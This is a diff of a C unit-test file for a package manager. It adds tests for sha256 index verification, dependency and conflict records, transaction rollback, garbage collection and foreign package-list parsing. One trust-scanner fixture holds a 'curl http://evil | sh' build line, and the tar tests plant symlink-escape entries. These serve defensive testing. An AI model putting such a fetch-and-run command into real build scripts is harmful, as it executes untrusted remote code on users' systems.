@@ -9,6 +9,9 @@
 #include "salt/db.h"
 #include "salt/repo.h"
 #include "salt/trust.h"
+#include "salt/txn.h"
+#include "salt/gc.h"
+#include "salt/run.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -18,13 +21,13 @@
 static int g_fail = 0;
 static int g_total = 0;
 
-#define CHECK(cond, msg)                              \
-  do {                                                \
-    g_total++;                                        \
-    if (!(cond)) {                                    \
+#define CHECK(cond, msg)                                     \
+  do {                                                       \
+    g_total++;                                               \
+    if (!(cond)) {                                           \
       printf("FAIL: %s (%s:%d)\n", msg, __FILE__, __LINE__); \
-      g_fail++;                                       \
-    }                                                 \
+      g_fail++;                                              \
+    }                                                        \
   } while (0)
 
 static void test_buf(void) {
@@ -134,8 +137,8 @@ static void test_tar(void) {
   salt_buf_init(&out);
   salt_tar_writer *w = salt_tar_writer_new(&out);
   const char *content = "file body";
-  salt_tar_entry e = {"usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content),
-                      NULL, content};
+  salt_tar_entry e = {
+      "usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content), NULL, content};
   salt_tar_writer_add(w, &e);
   salt_tar_writer_finish(w);
   salt_tar_writer_free(w);
@@ -202,7 +205,8 @@ static void test_tar_confinement(void) {
       {"usr/lib/evil/pwned", SALT_TAR_FILE, 0644, 3, NULL, "bad"},
   };
   tar_build(&a, e3, 2);
-  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK, "tar rejects write through planted symlink");
+  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK,
+        "tar rejects write through planted symlink");
   CHECK(!salt_path_exists(victim), "tar symlink hop did not write outside root");
   salt_buf_free(&a);
 
@@ -214,7 +218,8 @@ static void test_tar_confinement(void) {
       {"./usr/bin/tool", SALT_TAR_FILE, 0755, 2, NULL, "ok"},
   };
   tar_build(&a, e4, 5);
-  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) == SALT_OK, "tar allows in-root relative symlink hop");
+  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) == SALT_OK,
+        "tar allows in-root relative symlink hop");
   char *okp = salt_join_path(dest, "usr/share/ok.txt");
   char *toolp = salt_join_path(dest, "bin/tool");
   CHECK(salt_path_exists(okp), "in-root symlink hop wrote inside root");
@@ -229,7 +234,8 @@ static void test_tar_confinement(void) {
   salt_tar_entry e5 = {"usr/big", SALT_TAR_FILE, 0644, sizeof(big), NULL, big};
   tar_build(&a, &e5, 1);
   memcpy(trunc, a.data, 512);
-  CHECK(salt_tar_extract(trunc, sizeof(trunc), dest, NULL) != SALT_OK, "tar rejects size past end of archive");
+  CHECK(salt_tar_extract(trunc, sizeof(trunc), dest, NULL) != SALT_OK,
+        "tar rejects size past end of archive");
   salt_buf_free(&a);
 
   free(victim);
@@ -395,7 +401,8 @@ static void test_trust(void) {
   const char *bad =
       "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\"]\n"
       "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\nsha256=\"x\"\n"
-      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho 0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
+      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho "
+      "0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
   salt_write_file(rfile, bad, strlen(bad), 0644);
   salt_findings sf;
   salt_findings_init(&sf);
@@ -413,6 +420,429 @@ static void test_trust(void) {
   salt_remove_recursive(d);
 }
 
+static void build_pkg(const char *d, const char *name, const char *version, const char *dep,
+                      const char *conflict, salt_archive *ar, char **path_out) {
+  char *staging = salt_join_path(d, name);
+  char *rel = salt_join_path("usr/bin", name);
+  char *f = salt_join_path(staging, rel);
+  salt_write_file(f, name, strlen(name), 0755);
+  salt_pkg_meta m;
+  salt_pkg_meta_init(&m);
+  m.name = salt_strdup(name);
+  m.version = salt_strdup(version);
+  m.release = 1;
+  m.arch = salt_strdup("x86_64");
+  m.summary = salt_strdup("unit fixture");
+  m.license = salt_strdup("MIT");
+  m.repro_status = salt_strdup("verified");
+  if (dep) salt_strlist_push(&m.deps, dep);
+  if (conflict) salt_strlist_push(&m.conflicts, conflict);
+  CHECK(salt_archive_build_from_dir(staging, &m, NULL, ar) == SALT_OK, "fixture archive build");
+  salt_buf fn;
+  salt_buf_init(&fn);
+  salt_buf_printf(&fn, "%s-%s-1-x86_64.grain", name, version);
+  char *pkgdir = salt_join_path(d, "packages");
+  *path_out = salt_join_path(pkgdir, fn.data);
+  CHECK(salt_archive_write(ar, *path_out) == SALT_OK, "fixture archive write");
+  salt_buf_free(&fn);
+  salt_pkg_meta_free(&m);
+  free(pkgdir);
+  free(staging);
+  free(rel);
+  free(f);
+}
+
+static void test_repo_verify(void) {
+  CHECK(salt_sha256_hex_valid("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"),
+        "sha256 hex valid");
+  CHECK(!salt_sha256_hex_valid("TODO-sha256"), "sha256 placeholder rejected");
+  CHECK(!salt_sha256_hex_valid(NULL), "sha256 null rejected");
+  CHECK(!salt_sha256_hex_valid(""), "sha256 empty rejected");
+  CHECK(!salt_sha256_hex_valid("BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD"),
+        "sha256 uppercase rejected");
+  CHECK(!salt_sha256_hex_valid("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015a"),
+        "sha256 short rejected");
+
+  const char *good =
+      "repo = \"current\"\narch = \"x86_64\"\n"
+      "[[package]]\nname = \"a\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
+      "filename = \"a-1-1-x86_64.grain\"\n"
+      "sha256 = \"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\"\n"
+      "size = 1\nsummary = \"first\"\ndeps = []\nconflicts = [\"b\"]\n"
+      "[[package]]\nname = \"a\"\nversion = \"2\"\nrelease = 3\narch = \"x86_64\"\n"
+      "filename = \"a-2-3-x86_64.grain\"\n"
+      "sha256 = \"7898876d3e55c3a65154e802d3d7c05745984d4a2ea8b46f49c72f1c5b3c98d4\"\n"
+      "size = 1\ndeps = []\n";
+  char tmp[] = "/tmp/salt_idx_XXXXXX";
+  char *d = mkdtemp(tmp);
+  char *ip = salt_join_path(d, "index.toml");
+  salt_write_file(ip, good, strlen(good), 0644);
+  salt_repo_index idx;
+  CHECK(salt_repo_index_load(ip, &idx) == SALT_OK, "index load");
+  salt_strlist problems;
+  salt_strlist_init(&problems);
+  CHECK(salt_repo_index_verify(&idx, &problems) == SALT_OK && problems.len == 0,
+        "index with hashes verifies");
+  const salt_repo_entry *e = salt_repo_index_find_exact(&idx, "a", "2", 3);
+  CHECK(e && strcmp(e->filename, "a-2-3-x86_64.grain") == 0, "find exact version/release");
+  CHECK(salt_repo_index_find_exact(&idx, "a", "2", 1) == NULL, "find exact misses wrong release");
+  e = salt_repo_index_find_exact(&idx, "a", "1", 1);
+  CHECK(e && e->conflicts.len == 1 && strcmp(e->conflicts.items[0], "b") == 0,
+        "index conflicts loaded");
+  CHECK(e->summary && strcmp(e->summary, "first") == 0, "index summary loaded");
+  salt_strlist_free(&problems);
+  salt_repo_index_free(&idx);
+
+  const char *placeholder =
+      "repo = \"current\"\narch = \"x86_64\"\n"
+      "[[package]]\nname = \"a\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
+      "filename = \"a-1-1-x86_64.grain\"\nsha256 = \"TODO-sha256\"\nsize = 1\n"
+      "[[package]]\nname = \"b\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
+      "filename = \"b-1-1-x86_64.grain\"\nsize = 1\n";
+  salt_write_file(ip, placeholder, strlen(placeholder), 0644);
+  CHECK(salt_repo_index_load(ip, &idx) == SALT_OK, "index load placeholder");
+  salt_strlist_init(&problems);
+  CHECK(salt_repo_index_verify(&idx, &problems) != SALT_OK, "placeholder/missing sha256 fails");
+  CHECK(problems.len == 2, "one problem per bad entry");
+  CHECK(!salt_repo_entry_hash_ok(&idx.items[0]), "placeholder entry hash not ok");
+  CHECK(!salt_repo_entry_hash_ok(&idx.items[1]), "missing entry hash not ok");
+  salt_strlist_free(&problems);
+  salt_repo_index_free(&idx);
+  free(ip);
+  salt_remove_recursive(d);
+}
+
+static void test_db_deps_conflicts(void) {
+  char tmp[] = "/tmp/salt_deps_XXXXXX";
+  char *d = mkdtemp(tmp);
+  salt_archive lib, app, rival;
+  char *libp, *appp, *rivalp;
+  build_pkg(d, "lib", "1.0", NULL, NULL, &lib, &libp);
+  build_pkg(d, "app", "1.0", "lib", NULL, &app, &appp);
+  build_pkg(d, "rival", "1.0", NULL, "app", &rival, &rivalp);
+
+  char *dbp = salt_join_path(d, "db.sqlite");
+  salt_db *db;
+  CHECK(salt_db_open(dbp, &db) == SALT_OK, "deps db open");
+  int64_t txn;
+  salt_db_txn_new(db, "install", &txn);
+  CHECK(salt_db_record_install(db, &lib.meta, &lib.manifest, "current", "signed", txn) == SALT_OK,
+        "record lib");
+  CHECK(salt_db_record_install(db, &app.meta, &app.manifest, "current", "signed", txn) == SALT_OK,
+        "record app");
+  CHECK(
+      salt_db_record_install(db, &rival.meta, &rival.manifest, "current", "signed", txn) == SALT_OK,
+      "record rival");
+  CHECK(salt_db_set_pkg_artifact(
+            db, "lib", "lib-1.0-1-x86_64.grain",
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == SALT_OK,
+        "set artifact");
+  salt_db_txn_finish(db, txn, "ok");
+
+  salt_strlist l;
+  salt_strlist_init(&l);
+  salt_db_pkg_deps(db, "app", &l);
+  CHECK(l.len == 1 && strcmp(l.items[0], "lib") == 0, "pkg deps");
+  salt_strlist_free(&l);
+  salt_strlist_init(&l);
+  salt_db_revdeps(db, "lib", &l);
+  CHECK(l.len == 1 && strcmp(l.items[0], "app") == 0, "revdeps");
+  salt_strlist_free(&l);
+  salt_strlist_init(&l);
+  salt_db_conflicts_with(db, "app", &l);
+  CHECK(l.len == 1 && strcmp(l.items[0], "rival") == 0, "conflicts_with");
+  salt_strlist_free(&l);
+
+  salt_db_pkg p;
+  CHECK(salt_db_get_pkg(db, "lib", &p) == SALT_OK, "get pkg");
+  CHECK(p.sha256 && strcmp(p.sha256,
+                           "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
+        "artifact sha256 persisted");
+  CHECK(p.filename && strcmp(p.filename, "lib-1.0-1-x86_64.grain") == 0,
+        "artifact filename persisted");
+  CHECK(p.summary && strcmp(p.summary, "unit fixture") == 0, "summary persisted");
+  salt_db_pkg_free_fields(&p);
+
+  salt_db_pkglist found;
+  salt_db_pkglist_init(&found);
+  salt_db_search(db, "%fixture%", &found);
+  CHECK(found.len == 3, "db search matches summaries");
+  salt_db_pkglist_free(&found);
+
+  char *snap = salt_join_path(d, "db.before");
+  CHECK(salt_db_vacuum_into(db, snap) == SALT_OK, "vacuum into snapshot");
+  salt_strlist names;
+  salt_strlist_init(&names);
+  CHECK(salt_db_snapshot_filenames(snap, &names) == SALT_OK, "snapshot filenames");
+  CHECK(names.len == 1 && strcmp(names.items[0], "lib-1.0-1-x86_64.grain") == 0,
+        "snapshot lists referenced artifact");
+  salt_strlist_free(&names);
+
+  int64_t txn2;
+  salt_db_txn_new(db, "remove", &txn2);
+  CHECK(salt_db_record_remove(db, "rival", txn2) == SALT_OK, "remove rival");
+  salt_strlist_init(&l);
+  salt_db_conflicts_with(db, "app", &l);
+  CHECK(l.len == 0, "conflict rows removed with package");
+  salt_strlist_free(&l);
+  salt_db_txn_finish(db, txn2, "ok");
+
+  CHECK(salt_db_restore_state_from(db, snap) == SALT_OK, "restore state from snapshot");
+  CHECK(salt_db_is_installed(db, "rival"), "restore brings package back");
+  salt_strlist_init(&l);
+  salt_db_conflicts_with(db, "app", &l);
+  CHECK(l.len == 1, "restore brings conflict rows back");
+  salt_strlist_free(&l);
+  CHECK(
+      salt_db_get_pkg(db, "lib", &p) == SALT_OK && p.sha256 &&
+          strcmp(p.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
+      "restore keeps artifact sha256");
+  salt_db_pkg_free_fields(&p);
+
+  salt_db_close(db);
+  salt_archive_free(&lib);
+  salt_archive_free(&app);
+  salt_archive_free(&rival);
+  free(libp);
+  free(appp);
+  free(rivalp);
+  free(dbp);
+  free(snap);
+  salt_remove_recursive(d);
+}
+
+static void test_txn_rollback(void) {
+  char tmp[] = "/tmp/salt_txn_XXXXXX";
+  char *d = mkdtemp(tmp);
+  char *root = salt_join_path(d, "root");
+  salt_mkdirs(root, 0755);
+  salt_archive one, two;
+  char *onep, *twop;
+  build_pkg(d, "tool", "1.0", NULL, NULL, &one, &onep);
+  build_pkg(d, "tool", "2.0", NULL, NULL, &two, &twop);
+
+  salt_ctx ctx;
+  CHECK(salt_ctx_init(&ctx, root) == SALT_OK, "ctx init");
+  salt_db *db;
+  CHECK(salt_db_open(ctx.db_path, &db) == SALT_OK, "txn db open");
+
+  int64_t t1;
+  salt_db_txn_new(db, "install", &t1);
+  char *snap = NULL;
+  salt_snapshot_create(&ctx, db, t1, &snap);
+  if (snap) salt_db_txn_set_snapshot(db, t1, snap);
+  free(snap);
+  CHECK(salt_install_archive(&ctx, db, &one, "current", "signed", t1) == SALT_OK, "install 1.0");
+  salt_db_txn_finish(db, t1, "ok");
+  char *bin = salt_join_path(root, "usr/bin/tool");
+  salt_buf content;
+  salt_buf_init(&content);
+  CHECK(salt_read_file(bin, &content) == SALT_OK && content.len == 4 &&
+            memcmp(content.data, "tool", 4) == 0,
+        "1.0 payload on disk");
+  salt_buf_free(&content);
+
+  int64_t t2;
+  salt_db_txn_new(db, "update", &t2);
+  snap = NULL;
+  salt_snapshot_create(&ctx, db, t2, &snap);
+  if (snap) salt_db_txn_set_snapshot(db, t2, snap);
+  free(snap);
+  CHECK(salt_db_sql_begin(db) == SALT_OK, "sql begin");
+  CHECK(salt_install_archive(&ctx, db, &two, "current", "signed", t2) == SALT_OK, "install 2.0");
+  salt_db_pkg p;
+  CHECK(salt_db_get_pkg(db, "tool", &p) == SALT_OK && strcmp(p.version, "2.0") == 0,
+        "db sees 2.0 inside transaction");
+  salt_db_pkg_free_fields(&p);
+  CHECK(salt_db_sql_rollback(db) == SALT_OK, "sql rollback");
+  CHECK(salt_txn_revert_files(&ctx, t2) == SALT_OK, "revert files");
+  salt_db_txn_finish(db, t2, "failed");
+  CHECK(salt_db_get_pkg(db, "tool", &p) == SALT_OK && strcmp(p.version, "1.0") == 0,
+        "db back to 1.0 after failed transaction");
+  salt_db_pkg_free_fields(&p);
+  salt_buf_init(&content);
+  CHECK(salt_read_file(bin, &content) == SALT_OK && content.len == 4, "1.0 payload restored");
+  salt_buf_free(&content);
+
+  char *blocker = salt_join_path(root, "usr/share");
+  salt_write_file(blocker, "x", 1, 0644);
+  salt_archive three;
+  char *threep;
+  char *staging = salt_join_path(d, "blocked");
+  char *deep = salt_join_path(staging, "usr/share/blocked/file");
+  salt_write_file(deep, "y", 1, 0644);
+  salt_pkg_meta m;
+  salt_pkg_meta_init(&m);
+  m.name = salt_strdup("blocked");
+  m.version = salt_strdup("1.0");
+  m.release = 1;
+  m.arch = salt_strdup("x86_64");
+  m.license = salt_strdup("MIT");
+  m.repro_status = salt_strdup("verified");
+  CHECK(salt_archive_build_from_dir(staging, &m, NULL, &three) == SALT_OK, "blocked archive");
+  threep = salt_join_path(d, "blocked.grain");
+  int64_t t3;
+  salt_db_txn_new(db, "install", &t3);
+  CHECK(salt_db_sql_begin(db) == SALT_OK, "sql begin 3");
+  CHECK(salt_install_archive(&ctx, db, &three, "current", "signed", t3) != SALT_OK,
+        "install fails when a path component is a file");
+  salt_db_sql_rollback(db);
+  CHECK(salt_txn_revert_files(&ctx, t3) == SALT_OK, "revert after extraction failure");
+  salt_db_txn_finish(db, t3, "failed");
+  CHECK(!salt_db_is_installed(db, "blocked"), "failed install not recorded");
+  CHECK(salt_db_is_installed(db, "tool"), "other packages untouched");
+
+  int64_t t4;
+  salt_db_txn_new(db, "remove", &t4);
+  snap = NULL;
+  salt_snapshot_create(&ctx, db, t4, &snap);
+  if (snap) salt_db_txn_set_snapshot(db, t4, snap);
+  free(snap);
+  CHECK(salt_remove_pkg(&ctx, db, "tool", t4) == SALT_OK, "remove tool");
+  salt_db_txn_finish(db, t4, "ok");
+  CHECK(!salt_path_exists(bin), "removed file gone");
+  CHECK(salt_rollback_last(&ctx, db) == SALT_OK, "rollback last");
+  CHECK(salt_path_exists(bin) && salt_db_is_installed(db, "tool"), "rollback restores file and db");
+
+  salt_deployment_list deps;
+  salt_deployment_list_init(&deps);
+  salt_db_deployments(db, &deps);
+  size_t before = deps.len;
+  salt_deployment_list_free(&deps);
+  salt_gc_opts opts = {.keep = 1, .pinned = NULL, .npinned = 0, .dry_run = true};
+  salt_gc_report rep;
+  salt_gc_report_init(&rep);
+  CHECK(salt_gc_run(&ctx, db, &opts, &rep) == SALT_OK, "gc dry run");
+  CHECK(rep.generations_removed > 0, "gc dry run finds prunable generations");
+  salt_deployment_list_init(&deps);
+  salt_db_deployments(db, &deps);
+  CHECK(deps.len == before, "gc dry run changes nothing");
+  bool any_pruned = false;
+  for (size_t i = 0; i < deps.len; i++)
+    if (strcmp(deps.items[i].status, "pruned") == 0) any_pruned = true;
+  CHECK(!any_pruned, "gc dry run marks nothing pruned");
+  salt_deployment_list_free(&deps);
+  salt_gc_report_free(&rep);
+
+  int64_t pin = t1;
+  salt_gc_opts real = {.keep = 1, .pinned = &pin, .npinned = 1, .dry_run = false};
+  salt_gc_report_init(&rep);
+  CHECK(salt_gc_run(&ctx, db, &real, &rep) == SALT_OK, "gc run");
+  CHECK(rep.generations_removed > 0, "gc pruned generations");
+  salt_deployment_list_init(&deps);
+  salt_db_deployments(db, &deps);
+  bool newest_kept = false, pinned_kept = false;
+  for (size_t i = 0; i < deps.len; i++) {
+    if (deps.items[i].id == t1 && strcmp(deps.items[i].status, "ok") == 0) pinned_kept = true;
+    if (i == 0 && strcmp(deps.items[i].status, "ok") == 0) newest_kept = true;
+  }
+  CHECK(newest_kept, "gc keeps the current generation");
+  CHECK(pinned_kept, "gc keeps the pinned generation");
+  salt_buf sd;
+  salt_buf_init(&sd);
+  salt_buf_printf(&sd, "%s/txn-%lld", ctx.state_dir, (long long)t2);
+  CHECK(!salt_path_exists(sd.data), "gc removed the pruned generation's state");
+  salt_buf_free(&sd);
+  salt_deployment_list_free(&deps);
+  salt_gc_report_free(&rep);
+  CHECK(salt_path_exists(bin) && salt_db_is_installed(db, "tool"), "gc left the live system alone");
+
+  salt_db_close(db);
+  salt_ctx_free(&ctx);
+  salt_archive_free(&one);
+  salt_archive_free(&two);
+  salt_archive_free(&three);
+  salt_pkg_meta_free(&m);
+  free(onep);
+  free(twop);
+  free(threep);
+  free(bin);
+  free(blocker);
+  free(staging);
+  free(deep);
+  free(root);
+  salt_remove_recursive(d);
+}
+
+static void test_foreign_pkg(void) {
+  salt_foreign_pkg_list l;
+  salt_foreign_pkg_list_init(&l);
+  const char *pac = "zlib 1:1.3.1-2\nbash 5.2.037-1\n";
+  CHECK(salt_foreign_pkg_parse("pacman", pac, strlen(pac), &l) == SALT_OK, "pacman -Q parse");
+  CHECK(l.len == 2 && strcmp(l.items[0].name, "bash") == 0, "pacman sorted by name");
+  const salt_foreign_pkg *z = salt_foreign_pkg_list_find(&l, "zlib");
+  CHECK(z && strcmp(z->version, "1:1.3.1-2") == 0, "pacman epoch version kept");
+  salt_foreign_pkg_list_free(&l);
+
+  const char *dpkg =
+      "installed\tbash\t5.2.21-2ubuntu4\nconfig-files\told\t1.0\n"
+      "installed\tlibc6\t2.39-0ubuntu8.4\n";
+  CHECK(salt_foreign_pkg_parse("apt", dpkg, strlen(dpkg), &l) == SALT_OK, "dpkg-query parse");
+  CHECK(l.len == 2 && !salt_foreign_pkg_list_find(&l, "old"), "dpkg config-files skipped");
+  z = salt_foreign_pkg_list_find(&l, "libc6");
+  CHECK(z && strcmp(z->version, "2.39-0ubuntu8.4") == 0, "dpkg version");
+  salt_foreign_pkg_list_free(&l);
+
+  const char *apk =
+      "WARNING: opening from cache\nmusl-1.2.5-r0\nca-certificates-bundle-20240705-r0\n";
+  CHECK(salt_foreign_pkg_parse("apk", apk, strlen(apk), &l) == SALT_OK, "apk info parse");
+  z = salt_foreign_pkg_list_find(&l, "ca-certificates-bundle");
+  CHECK(l.len == 2 && z && strcmp(z->version, "20240705-r0") == 0, "apk dashed name split");
+  salt_foreign_pkg_list_free(&l);
+  const char *apk_bad = "nodash\n";
+  CHECK(salt_foreign_pkg_parse("apk", apk_bad, strlen(apk_bad), &l) != SALT_OK,
+        "apk malformed line rejected");
+  salt_foreign_pkg_list_free(&l);
+
+  const char *rpm = "gpg-pubkey\t18b8e74c-62f2920f\nbash\t5.2.26-3.fc40\nglibc\t2.39-33.fc40\n";
+  CHECK(salt_foreign_pkg_parse("dnf", rpm, strlen(rpm), &l) == SALT_OK, "rpm -qa parse");
+  CHECK(l.len == 2 && !salt_foreign_pkg_list_find(&l, "gpg-pubkey"), "rpm gpg-pubkey skipped");
+  salt_foreign_pkg_list_free(&l);
+
+  const char *xbps =
+      "ii base-files-0.143_3          Void Linux base\n"
+      "uu old-1.0_1  unpacked\nii zlib-1.3.1_1  zlib\n";
+  CHECK(salt_foreign_pkg_parse("xbps", xbps, strlen(xbps), &l) == SALT_OK, "xbps-query -l parse");
+  z = salt_foreign_pkg_list_find(&l, "base-files");
+  CHECK(l.len == 2 && z && strcmp(z->version, "0.143_3") == 0, "xbps pkgver split");
+  salt_foreign_pkg_list_free(&l);
+
+  CHECK(salt_foreign_pkg_parse("brew", "x 1\n", 4, &l) != SALT_OK, "unknown manager rejected");
+  salt_foreign_pkg_list_free(&l);
+
+  salt_buf spec;
+  salt_buf_init(&spec);
+  CHECK(salt_foreign_pkg_spec("apt", "bash", "5.2.21-2ubuntu4", &spec) == SALT_OK &&
+            strcmp(spec.data, "bash=5.2.21-2ubuntu4") == 0,
+        "apt exact spec");
+  salt_buf_free(&spec);
+  salt_buf_init(&spec);
+  CHECK(salt_foreign_pkg_spec("dnf", "bash", "5.2.26-3.fc40", &spec) == SALT_OK &&
+            strcmp(spec.data, "bash-5.2.26-3.fc40") == 0,
+        "dnf exact spec");
+  salt_buf_free(&spec);
+  salt_buf_init(&spec);
+  CHECK(salt_foreign_pkg_spec("xbps", "zlib", "1.3.1_1", &spec) == SALT_OK &&
+            strcmp(spec.data, "zlib-1.3.1_1") == 0,
+        "xbps exact spec");
+  salt_buf_free(&spec);
+  salt_buf_init(&spec);
+  CHECK(salt_foreign_pkg_spec("pacman", "zlib", "1.3.1-2", &spec) != SALT_OK,
+        "pacman has no versioned repo spec");
+  CHECK(salt_foreign_pkg_spec("apk", "zlib", "", &spec) != SALT_OK, "empty version rejected");
+  salt_buf_free(&spec);
+
+  salt_stratum st;
+  memset(&st, 0, sizeof(st));
+  st.family = "ubuntu";
+  CHECK(strcmp(salt_stratum_pkg_kind(&st), "apt") == 0, "kind from family");
+  st.package_manager = "xbps";
+  CHECK(strcmp(salt_stratum_pkg_kind(&st), "xbps") == 0, "kind prefers package_manager");
+  st.package_manager = "nix";
+  st.family = "nixos";
+  CHECK(salt_stratum_pkg_kind(&st) == NULL, "unknown kind is NULL");
+}
+
 int main(void) {
   test_buf();
   test_strlist();
@@ -426,6 +856,10 @@ int main(void) {
   test_archive_db();
   test_repo();
   test_trust();
+  test_repo_verify();
+  test_db_deps_conflicts();
+  test_txn_rollback();
+  test_foreign_pkg();
   printf("\n%d/%d checks passed\n", g_total - g_fail, g_total);
   return g_fail ? 1 : 0;
 }
